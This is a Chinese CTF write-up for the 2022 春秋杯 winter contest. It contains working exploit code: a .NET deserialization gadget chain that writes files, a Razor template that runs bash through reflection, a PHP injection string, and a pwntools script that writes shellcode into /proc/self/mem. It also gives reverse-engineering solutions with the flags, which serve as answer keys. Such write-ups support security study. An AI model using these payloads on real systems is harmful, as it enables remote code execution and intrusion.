---
title: 2022 春秋杯冬季赛 WriteUp By EDISEC
contest: 2022 春秋杯冬季赛
year: 2022
difficulty: medium
vuln_type: [rce, web_unknown, ret2libc, reverse, crypto_oracle]
tags: [.NET, ComparerData, ASP.NET-Razor, File.WriteAllText, Process.Start, /proc/self/mem, DCT, FCT, bit-rotate, Go-reflect, 春秋杯]
attack_chain: ["Web ezdoenot: .NET ComparerData<T> 反射 + SerTools.Serialize gadget → File.WriteAllText 写文件", "Web ezphp: ?num=1||1 注入", "Misc 楠之勇者: getmoney 10 次 → buy 1 个记事录 → writeevil ../proc/self/mem +0x600000 shellcode", "Re baby_transform: 42 个 8 字节 (float) → DCT 逆变换 (an,bn 计算) → flag{e320d3aa-...}", "Re easy_python: flag[i] = (flag[i] >> 5) | ((flag[i] << 3) & 255) 位旋转 → flag{ddbae889-...}", "Re godeep: IDA 反射 + 函数解析 Go 二进制"]
key_payload: "DCT 逆变换 an = sum(val[x][1] * cos(-2πxn/N)) / N"
one_liner: 春秋杯 2022 冬季赛 6 大题：.NET + ASP.NET Razor + Python game + DCT + 位旋转 + Go
lesson: .NET Gadget 链 + ASP.NET Razor 反射是高级 web；/proc/self/mem 写 shellcode 是经典 Linux pwn；DCT 逆变换是 reverse 入门
quality: high
---

# 2022 春秋杯冬季赛 WriteUp By EDISEC

原文 https://www.ctfiot.com/88092.html

## Web

### ezdoenot (.NET 反序列化)
```csharp
static void Main(string[] args) {
    ComparerData<string> comparerDataObj = new ComparerData<string>();
    string tpl = File.ReadAllText(@"static\error.html");
    Gadget<string> gadgetObj = new Gadget<string>(comparerDataObj, "static/error.html", tpl);
    Type gadgetType = gadgetObj.GetType();
    FieldInfo keyFiled = gadgetType.GetField("key", BindingFlags.Instance | BindingFlags.NonPublic);
    keyFiled.SetValue(gadgetObj, "c482f17d0ab14fdc9752b28f36ff2020");
    
    Type comparerDataType = comparerDataObj.GetType();
    FieldInfo isVoidField = comparerDataType.GetField("isVoid", BindingFlags.Instance | BindingFlags.NonPublic);
    isVoidField.SetValue(comparerDataObj, true);
    
    Type innerClassMethodType = comparerDataType.GetNestedTypes(BindingFlags.NonPublic)[0];
    innerClassMethodType = innerClassMethodType.MakeGenericType(typeof(string));
    
    FieldInfo classnameFiled = innerClassMethodType.GetField("Classname", BindingFlags.Instance | BindingFlags.NonPublic);
    FieldInfo methodnameFiled = innerClassMethodType.GetField("Methodname", BindingFlags.Instance | BindingFlags.NonPublic);
    Object innerClassMethodObj = Activator.CreateInstance(innerClassMethodType);
    classnameFiled.SetValue(innerClassMethodObj, "System.IO.File");
    methodnameFiled.SetValue(innerClassMethodObj, "WriteAllText");
    
    FieldInfo cFiled = comparerDataType.GetField("c", BindingFlags.Instance | BindingFlags.NonPublic);
    cFiled.SetValue(comparerDataObj, innerClassMethodObj);
    Console.WriteLine(SerTools.Serialize(gadgetObj));
}
```

**ASP.NET Razor 内联 RCE：**
```razor
@using System.Reflection;
@{
    Assembly assembly = Assembly.Load("System.Diagnostics.Process");
    var processType = assembly.GetType("System.Diagnostics.Process");
    var startMethod = processType.GetMethod("Start", BindingFlags.Static | BindingFlags.Public, null, new Type[]{typeof(string),typeof(string)}, null);
    startMethod.Invoke(null, new []{"/bin/bash", "/app/wwwroot/js/1.sh"});
}
@processType.FullName;
```

### ezphp
```
?num=1||1
```

## Misc

### 楠之勇者 (Python pwn)
```python
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
io = remote("39.106.48.123", 27713)
io.sendlineafter("请告诉我你的姓名：", "Mrsh")
io.sendlineafter(">>", "1")

def getmoney(n):
    for i in range(n):
        io.sendlineafter(">>", "4")
        io.sendlineafter("（按Enter键继续）", "n")

def buy(n):
    io.sendlineafter(">>", "3")
    io.sendlineafter(">>", str(n))
    io.sendlineafter(">>", 'a')
    io.sendlineafter("（按Enter键继续）", "n")

def writeevil(file, offset, data):
    io.sendlineafter(">>", "2")
    io.sendlineafter(">>", "1")
    io.sendlineafter("输入你的记事录名称：", file)
    io.sendlineafter("从第几页开始记录：", str(offset))
    io.sendlineafter("（魔杖附效）输入内容：", base64.b64encode(data))

getmoney(10)
buy(1)
sh = asm(shellcraft.amd64.linux.sh())
writeevil("../proc/self/mem", 0x600000, sh.rjust(0x1000, b"\x90"))
io.interactive()
```

**关键：** Python 程序 → /proc/self/mem 写 shellcode → Python 进程被劫持

## Re

### baby_transform (DCT 逆变换)
```python
import struct
fp = open(r"flag.enc", "rb")
data = fp.read()
val = []
def hex_to_float(I):
    return struct.unpack('<d', I)[0]

for i in range(0, 84, 2):
    t1 = hex_to_float(data[i*8:i*8+8])
    t2 = hex_to_float(data[i*8+8:i*8+16])
    val.append((t1, t2))

import math
PAI = 3.141592653589793
N = 42
for n in range(42):
    an = bn = 0
    for x in range(42):
        an += val[x][1] * math.cos(-2*PAI*x*n / N)
        bn += val[x][0] * math.sin(-2*PAI*x*n / N)
    an *= (1/N)
    bn *= (1/N)
    print(chr(int(an - bn + 0.5)), end="")
# f}c3a26829fa7f-080b-1ab4-0fb7-aa3d023e{gal
# 取反: flag{e320d3aa-7bf0-4ba1-b080-f7af92862a3c}
```

### easy_python (位旋转)
```python
flag = [204, 141, 44, 236, 111, 140, 140, 76, 44, 172, 7, 7, 39, 165, 70, 7,
        39, 166, 165, 134, 134, 140, 204, 165, 7, 39, 230, 140, 165, 70,
        44, 172, 102, 6, 140, 204, 230, 230, 76, 198, 38, 175]
for i in range(42):
    flag[i] = (flag[i] >> 5) | ((flag[i] << 3) & 255)
    print(chr(flag[i]), end="")
# flag{ddbae889-2895-44df-897d-2ae30df77b61}
```

### godeep (Go reverse)
```python
import idaapi
import idautils
def Ida_Decode(fp, begin, end):
    All_Fun = list(idautils.Functions(begin, end))
    for i in range(len(All_Fun)):
        func = idaapi.get_func(All_Fun[i])
        cfunc = idaapi.decompile(func.start_ea)
        fp.write(str(cfunc))
```

## 教学价值
- **.NET ComparerData 链** 是 Windows 高级反序列化
- **ASP.NET Razor** 内联反射 = C# 代码执行
- **/proc/self/mem 写 shellcode** 是 Python pwn 经典
- **DCT / FCT** 是图像压缩基础
- **位旋转** `(x >> n) | (x << (8-n)) & 0xff` 是入门密码
- **Go IDA 反射** 是 Go reverse 工具

## 工具
- dnSpy / ILSpy（.NET）
- yosocial/ysoserial.net
- pwntools
- IDA Pro + GoReSym
